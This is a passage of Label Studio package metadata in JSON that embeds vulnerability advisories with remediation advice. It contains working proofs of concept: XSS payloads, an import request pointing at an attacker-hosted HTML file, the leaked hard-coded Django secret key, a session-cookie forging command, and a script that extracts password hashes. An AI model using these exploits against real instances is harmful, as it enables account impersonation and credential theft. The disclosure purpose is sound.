import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.3/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (==0.0.3)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"01c5f9da28c4168945764d0b5937eb44224dbb5330009cb92ab96b6cf6f42353","md5":"7da61f446f35282e2d3cdb783961faca","sha256":"c44ed4210a677b969b3c5e7302963cb59523e4eb2878e74b1cba14a36642b085"},"downloads":-1,"filename":"label_studio-0.4.3-py3-none-any.whl","has_sig":false,"md5_digest":"7da61f446f35282e2d3cdb783961faca","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6857074,"upload_time":"2020-01-16T20:15:26","upload_time_iso_8601":"2020-01-16T20:15:26.816314Z","url":"https://files.pythonhosted.org/packages/01/c5/f9da28c4168945764d0b5937eb44224dbb5330009cb92ab96b6cf6f42353/label_studio-0.4.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"33f80d455320272307e3f9f746f9ec953bd146de243cea76098bbb35d7d8ac6b","md5":"a9b18e6e669687088d04c38b173fd8d6","sha256":"72abcddc2b156449ac1a5ed176ce5dff498d6b0df20eb7c0e9f3d1ca69aea157"},"downloads":-1,"filename":"label-studio-0.4.3.tar.gz","has_sig":false,"md5_digest":"a9b18e6e669687088d04c38b173fd8d6","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6793694,"upload_time":"2020-01-16T20:15:39","upload_time_iso_8601":"2020-01-16T20:15:39.793290Z","url":"https://files.pythonhosted.org/packages/33/f8/0d455320272307e3f9f746f9ec953bd146de243cea76098bbb35d7d8ac6b/label-studio-0.4.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            